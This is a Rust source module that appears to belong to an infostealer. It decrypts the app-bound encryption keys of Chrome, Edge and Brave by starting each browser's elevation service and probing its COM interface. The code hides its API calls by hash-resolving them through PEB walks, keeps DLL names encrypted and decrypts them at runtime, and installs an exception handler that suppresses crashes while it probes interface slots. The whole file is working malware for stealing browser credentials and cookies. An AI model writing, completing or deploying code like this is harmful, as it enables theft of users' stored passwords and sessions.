#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ffi::c_void;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::sync::OnceLock;

use crate::core_utils::api_hash::{
    H_KERNEL32, H_OLE32, H_OLEAUT32, H_ADVAPI32,
    H_LoadLibraryA, H_GetProcAddress,
    H_CoInitializeEx, H_CoUninitialize, H_CoCreateInstance, H_CoSetProxyBlanket,
    H_SysAllocStringByteLen, H_SysFreeString, H_SysStringByteLen,
    H_OpenSCManagerW, H_OpenServiceW, H_StartServiceW, H_CloseServiceHandle,
    H_AddVectoredExceptionHandler,
};

type FnCoInitializeEx = unsafe extern "system" fn(*const c_void, u32) -> i32;
type FnCoUninitialize = unsafe extern "system" fn();
type FnCoCreateInstance = unsafe extern "system" fn(*const c_void, *const c_void, u32, *const c_void, *mut *mut c_void) -> i32;
type FnCoSetProxyBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
type FnSysFreeString = unsafe extern "system" fn(*mut u16);
type FnSysStringByteLen = unsafe extern "system" fn(*const u16) -> u32;
type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

type FnOpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
type FnOpenServiceW = unsafe extern "system" fn(*mut c_void, *const u16, u32) -> *mut c_void;
type FnStartServiceW = unsafe extern "system" fn(*mut c_void, u32, *const *const u16) -> i32;
type FnCloseServiceHandle = unsafe extern "system" fn(*mut c_void, u32) -> i32;

struct ComApis {
    co_init: FnCoInitializeEx,
    co_uninit: FnCoUninitialize,
    co_create: FnCoCreateInstance,
    co_proxy: FnCoSetProxyBlanket,
    sys_alloc: FnSysAllocStringByteLen,
    sys_free: FnSysFreeString,
    sys_len: FnSysStringByteLen,
}

struct SvcApis {
    open_scm: FnOpenSCManagerW,
    open_svc: FnOpenServiceW,
    start_svc: FnStartServiceW,
    close_svc: FnCloseServiceHandle,
}

static COM_APIS: OnceLock<Option<ComApis>> = OnceLock::new();
static SVC_APIS: OnceLock<Option<SvcApis>> = OnceLock::new();

const COINIT_MULTITHREADED: u32 = 0x0;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;

type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> *mut u8;
type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8;

static RESOLVE_APIS: OnceLock<Option<(FnLoadLibraryA, FnGetProcAddress)>> = OnceLock::new();

fn get_resolve_apis() -> Option<(FnLoadLibraryA, FnGetProcAddress)> {
    let opt = RESOLVE_APIS.get_or_init(|| unsafe {
        // Resolve kernel32 by hash from PEB — no string in binary.
        let k32 = inject::syscall::get_module_base_by_hash(H_KERNEL32)?;
        let ll_addr = inject::syscall::resolve_export_by_hash(k32, H_LoadLibraryA)?;
        let gp_addr = inject::syscall::resolve_export_by_hash(k32, H_GetProcAddress)?;
        Some((mem::transmute_copy(&ll_addr), mem::transmute_copy(&gp_addr)))
    });
    *opt
}

// Resolve an export by hash from a DLL identified by module_hash.
// Uses LoadLibraryA (resolved by hash) to load the DLL, then GetProcAddress
// is NOT called — we walk the export table by hash directly.
unsafe fn resolve_fn_by_hash(module_hash: u32, export_hash: u32) -> *mut u8 {
    // First try the module if already loaded (PEB walk).
    if let Some(base) = inject::syscall::get_module_base_by_hash(module_hash) {
        if let Some(addr) = inject::syscall::resolve_export_by_hash(base, export_hash) {
            return addr;
        }
    }
    // Not loaded yet — use LoadLibraryA (resolved by hash from kernel32) to load it,
    // then walk the export table by hash (no GetProcAddress call).
    let (ll, _gp) = match get_resolve_apis() {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };
    // Build a temporary null-terminated byte string for LoadLibraryA from the
    // known DLL names via a static dispatch on module_hash (decrypted at runtime).
    let dll_name: Vec<u8> = if module_hash == H_OLE32 {
        let mut v = crate::encrypted::s_det_ole32().into_bytes(); v.push(0); v
    } else if module_hash == H_OLEAUT32 {
        let mut v = crate::encrypted::s_det_oleaut32().into_bytes(); v.push(0); v
    } else if module_hash == H_ADVAPI32 {
        let mut v = crate::encrypted::s_det_advapi32().into_bytes(); v.push(0); v
    } else {
        return std::ptr::null_mut();
    };
    let hmod = ll(dll_name.as_ptr() as *const i8);
    if hmod.is_null() { return std::ptr::null_mut(); }
    inject::syscall::resolve_export_by_hash(hmod, export_hash)
        .unwrap_or(std::ptr::null_mut())
}

fn init_com() -> Option<&'static ComApis> {
    let opt = COM_APIS.get_or_init(|| unsafe {
        let ci = resolve_fn_by_hash(H_OLE32,    H_CoInitializeEx);
        let cu = resolve_fn_by_hash(H_OLE32,    H_CoUninitialize);
        let cc = resolve_fn_by_hash(H_OLE32,    H_CoCreateInstance);
        let cp = resolve_fn_by_hash(H_OLE32,    H_CoSetProxyBlanket);
        let sa = resolve_fn_by_hash(H_OLEAUT32, H_SysAllocStringByteLen);
        let sf = resolve_fn_by_hash(H_OLEAUT32, H_SysFreeString);
        let sl = resolve_fn_by_hash(H_OLEAUT32, H_SysStringByteLen);
        if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
            return None;
        }
        Some(ComApis {
            co_init: mem::transmute_copy(&ci),
            co_uninit: mem::transmute_copy(&cu),
            co_create: mem::transmute_copy(&cc),
            co_proxy: mem::transmute_copy(&cp),
            sys_alloc: mem::transmute_copy(&sa),
            sys_free: mem::transmute_copy(&sf),
            sys_len: mem::transmute_copy(&sl),
        })
    });
    opt.as_ref()
}

fn init_svc() -> Option<&'static SvcApis> {
    let opt = SVC_APIS.get_or_init(|| unsafe {
        let os = resolve_fn_by_hash(H_ADVAPI32, H_OpenSCManagerW);
        let oh = resolve_fn_by_hash(H_ADVAPI32, H_OpenServiceW);
        let ss = resolve_fn_by_hash(H_ADVAPI32, H_StartServiceW);
        let cs = resolve_fn_by_hash(H_ADVAPI32, H_CloseServiceHandle);
        if os.is_null() || oh.is_null() || ss.is_null() || cs.is_null() {
            return None;
        }
        Some(SvcApis {
            open_scm: mem::transmute_copy(&os),
            open_svc: mem::transmute_copy(&oh),
            start_svc: mem::transmute_copy(&ss),
            close_svc: mem::transmute_copy(&cs),
        })
    });
    opt.as_ref()
}

fn start_service(name: &str) {
    let svc = match init_svc() {
        Some(s) => s,
        None => return,
    };
    unsafe {
        let scm = (svc.open_scm)(std::ptr::null(), std::ptr::null(), 0x0001);
        let wide: Vec<u16> = std::ffi::OsStr::new(name).encode_wide().chain(Some(0)).collect();
        let h = (svc.open_svc)(scm, wide.as_ptr(), 0x0010);
        if h.is_null() {
            (svc.close_svc)(scm, 0);
            return;
        }
        let _r = (svc.start_svc)(h, 0, std::ptr::null());
        (svc.close_svc)(h, 0);
        (svc.close_svc)(scm, 0);
    }
}

struct Bstr(*mut u16);
impl Bstr {
    unsafe fn new(data: &[u8]) -> Option<Self> {
        let api = init_com()?;
        let p = (api.sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() { None } else { Some(Bstr(p)) }
    }
    fn ptr(&self) -> *mut u16 { self.0 }
}
impl Drop for Bstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { if let Some(a) = init_com() { (a.sys_free)(self.0); } };
            self.0 = std::ptr::null_mut();
        }
    }
}

static mut SLOT_CRASHED: bool = false;

type FnAddVEH = unsafe extern "system" fn(u32, *mut c_void) -> *mut c_void;
static VEH_FN: OnceLock<Option<FnAddVEH>> = OnceLock::new();

#[repr(C)]
struct EXCEPTION_RECORD {
    exception_code: u32,
    exception_flags: u32,
    exception_record: *mut EXCEPTION_RECORD,
    exception_address: *mut c_void,
    number_parameters: u32,
    _reserved: u32,
    exception_information: [usize; 15],
}

#[repr(C)]
struct EXCEPTION_POINTERS {
    exception_record: *mut EXCEPTION_RECORD,
    context_record: *mut c_void,
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    if !exception_info.is_null() {
        let code = (*(*exception_info).exception_record).exception_code;
        if code == 0xC0000005 {
            SLOT_CRASHED = true;
            return -1;
        }
    }
    0
}

fn install_veh() {
    VEH_FN.get_or_init(|| unsafe {
        // AddVectoredExceptionHandler lives in kernel32.
        let addr = inject::syscall::get_module_base_by_hash(H_KERNEL32)
            .and_then(|k32| inject::syscall::resolve_export_by_hash(k32, H_AddVectoredExceptionHandler));
        let addr = match addr {
            Some(p) => p,
            None => return None,
        };
        mem::transmute_copy(&addr)
    });
    unsafe {
        if let Some(Some(f)) = VEH_FN.get() {
            f(1, veh_handler as *mut c_void);
        }
    }
}

unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
    let api = init_com().ok_or("e0")?;
    let vtbl = *(punk as *const *const c_void);

    for &slot in slots {
        let slot_ptr = (vtbl as *const *const c_void).add(slot);
        let fn_ptr = *(slot_ptr);
        let dec: FnDec = mem::transmute_copy(&fn_ptr);

        let cipher = match Bstr::new(enc) {
            Some(c) => c,
            None => continue,
        };
        let mut plain: *mut u16 = std::ptr::null_mut();
        let mut err: u32 = 0;
        SLOT_CRASHED = false;
        let hr = dec(punk, cipher.ptr(), &mut plain, &mut err);
        if SLOT_CRASHED {
            continue;
        }
        if hr < 0 || plain.is_null() {
            continue;
        }
        let len = (api.sys_len)(plain) as usize;
        let data = std::slice::from_raw_parts(plain as *const u8, len).to_vec();
        (api.sys_free)(plain);
        if data.len() == 32 { return Ok(data); }
        if data.len() > 32 {
            let tail = &data[data.len()-32..];
            if tail.iter().any(|&b| b != 0) {
                return Ok(tail.to_vec());
            }
        }
    }
    Err("e1".into())
}

unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
    let api = init_com().ok_or("e0")?;
    let _hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);

    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = (api.co_create)(clsid.as_ptr() as *const c_void, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid.as_ptr() as *const c_void, &mut punk);
    if hr < 0 || punk.is_null() {
        (api.co_uninit)();
        return Err(format!("e1:{:08X}", hr as u32));
    }

    let _ = (api.co_proxy)(punk, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, std::ptr::null(), 6, 3, std::ptr::null(), 0x40);

    let result = try_slots(punk, enc, slots);

    let vtbl = *(punk as *const *const c_void);
    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute_copy(&(*(vtbl as *const *const c_void).add(2)));
    rel(punk);
    (api.co_uninit)();
    result
}

struct BrowserEntry {
    clsid_fn: fn() -> String,
    iids_fns: &'static [fn() -> String],
    slots: &'static [usize],
    service_fn: fn() -> String,
}

use crate::encrypted::*;

static BROWSERS: &[BrowserEntry] = &[
    BrowserEntry { clsid_fn: s_elev_chrome_clsid, iids_fns: &[s_elev_chrome_iid1, s_elev_chrome_iid2], slots: &[5, 6, 7, 8], service_fn: s_elev_chrome_svc },
    BrowserEntry { clsid_fn: s_elev_edge_clsid,   iids_fns: &[s_elev_edge_iid1,   s_elev_edge_iid2],   slots: &[5, 6, 7, 8], service_fn: s_elev_edge_svc   },
    BrowserEntry { clsid_fn: s_elev_brave_clsid,  iids_fns: &[s_elev_brave_iid1],                       slots: &[5, 6, 7, 8], service_fn: s_elev_brave_svc  },
];

fn hex_to_guid_bytes(hex: &str) -> Vec<u8> {
    let clean = hex.trim_start_matches('{').trim_end_matches('}');
    let parts: Vec<&str> = clean.split('-').collect();
    if parts.len() != 5 { return Vec::new(); }
    let mut result = Vec::with_capacity(16);

    result.extend(parts[0].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    result.extend(parts[1].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    result.extend(parts[2].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    let p3 = parts[3].as_bytes();
    let p4 = parts[4].as_bytes();
    for i in (0..4).step_by(2) {
        result.push(u8::from_str_radix(std::str::from_utf8(&p3[i..i+2]).unwrap_or("00"), 16).unwrap_or(0));
    }
    for i in (0..12).step_by(2) {
        result.push(u8::from_str_radix(std::str::from_utf8(&p4[i..i+2]).unwrap_or("00"), 16).unwrap_or(0));
    }
    result
}

pub fn try_decrypt_app_bound_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        try_decrypt_inner(encrypted_key)
    }));

    match result {
        Ok(r) => r,
        Err(_) => {
            None
        }
    }
}

fn try_decrypt_inner(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    if init_com().is_none() {
        return None;
    }

    install_veh();

    for b in BROWSERS {
        let svc = (b.service_fn)();
        start_service(&svc);
        std::thread::sleep(std::time::Duration::from_millis(400));

        let clsid_s = (b.clsid_fn)();
        let clsid = hex_to_guid_bytes(&clsid_s);

        for iid_fn in b.iids_fns {
            let iid_s = iid_fn();
            let iid = hex_to_guid_bytes(&iid_s);
            if iid.len() != 16 { continue; }
            match unsafe { try_one(&clsid, &iid, encrypted_key, b.slots) } {
                Ok(key) => {
                    if key.len() == 32 {
                        return Some(key);
                    }
                }
                Err(_) => continue,
            }
        }
    }

    None
}
